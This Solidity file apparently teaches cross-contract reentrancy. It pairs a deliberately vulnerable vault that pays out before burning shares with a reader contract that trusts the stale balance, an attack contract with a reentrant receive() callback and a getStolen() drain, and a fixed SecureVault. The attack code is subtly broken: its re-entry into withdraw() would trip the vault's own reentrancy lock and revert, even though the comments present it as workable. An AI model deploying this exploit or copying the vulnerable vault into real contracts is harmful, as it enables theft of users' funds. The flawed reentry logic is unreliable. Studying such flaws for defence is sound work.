// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Shared token contract tracking balances
contract ShareToken {
    mapping(address => uint256) public shares;
    address public vault;
    
    constructor() {
        vault = msg.sender;
    }
    
    modifier onlyVault() {
        require(msg.sender == vault, "Only vault");
        _;
    }
    
    function mint(address account, uint256 amount) external onlyVault {
        shares[account] += amount;
    }
    
    function burn(address account, uint256 amount) external onlyVault {
        require(shares[account] >= amount, "Insufficient shares");
        shares[account] -= amount;
    }
    
    function balanceOf(address account) external view returns (uint256) {
        return shares[account];
    }
}

// Vault contract using the shared token
contract VulnerableVault {
    ShareToken public shareToken;
    bool private locked;
    
    modifier noReentrant() {
        require(!locked, "No reentrancy");
        locked = true;
        _;
        locked = false;
    }
    
    constructor() {
        shareToken = new ShareToken();
    }
    
    function deposit() external payable noReentrant {
        shareToken.mint(msg.sender, msg.value);
    }
    
    // VULNERABLE: Burns shares AFTER sending ETH
    function withdraw() external noReentrant {
        uint256 shares = shareToken.balanceOf(msg.sender);
        require(shares > 0, "No shares");
        
        // External call BEFORE burning shares
        (bool success, ) = msg.sender.call{value: shares}("");
        require(success, "Transfer failed");
        
        // Burn happens too late!
        shareToken.burn(msg.sender, shares);
    }
    
    receive() external payable {}
}

// Another contract that reads the shared state
contract VaultReader {
    ShareToken public shareToken;
    
    constructor(address _shareToken) {
        shareToken = ShareToken(_shareToken);
    }
    
    // VULNERABLE: Reads potentially inconsistent state
    function getUserShares(address user) external view returns (uint256) {
        return shareToken.balanceOf(user);
    }
    
    function canBorrowAgainst(address user, uint256 amount) external view returns (bool) {
        uint256 collateral = shareToken.balanceOf(user);
        return collateral >= amount * 2; // 200% collateralization
    }
}

interface IVulnerableVault {
    function deposit() external payable;
    function withdraw() external;
}

interface IShareToken {
    function balanceOf(address) external view returns (uint256);
}

interface IVaultReader {
    function canBorrowAgainst(address, uint256) external view returns (bool);
}

contract CrossContractAttack {
    IVulnerableVault public vault;
    IVaultReader public reader;
    IShareToken public shareToken;
    uint256 public attackCount;
    
    constructor(address _vault, address _reader, address _shareToken) {
        vault = IVulnerableVault(_vault);
        reader = IVaultReader(_reader);
        shareToken = IShareToken(_shareToken);
    }
    
    function depositToVault() external payable {
        vault.deposit{value: msg.value}();
    }
    
    function attack() external {
        attackCount = 0;
        vault.withdraw();
    }
    
    receive() external payable {
        // During callback, shares haven't been burned yet!
        // We still appear to have collateral in the shared state
        uint256 myShares = shareToken.balanceOf(address(this));
        
        if (attackCount == 0 && myShares > 0) {
            attackCount++;
            
            // Exploit: VaultReader sees we still have shares
            // even though we're withdrawing
            bool canBorrow = reader.canBorrowAgainst(address(this), 1 ether);
            
            if (canBorrow) {
                // Could borrow against "ghost" collateral here
                // Or reenter vault again
                vault.withdraw();
            }
        }
    }
    
    function getStolen() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}

contract SecureVault {
    ShareToken public shareToken;
    bool private locked;
    
    modifier noReentrant() {
        require(!locked, "No reentrancy");
        locked = true;
        _;
        locked = false;
    }
    
    constructor() {
        shareToken = new ShareToken();
    }
    
    function deposit() external payable noReentrant {
        shareToken.mint(msg.sender, msg.value);
    }
    
    // FIXED: Burn shares BEFORE external call
    function withdraw() external noReentrant {
        uint256 shares = shareToken.balanceOf(msg.sender);
        require(shares > 0, "No shares");
        
        // Burn BEFORE external call (following CEI)
        shareToken.burn(msg.sender, shares);
        
        // External call happens after state update
        (bool success, ) = msg.sender.call{value: shares}("");
        require(success, "Transfer failed");
    }
    
    receive() external payable {}
}
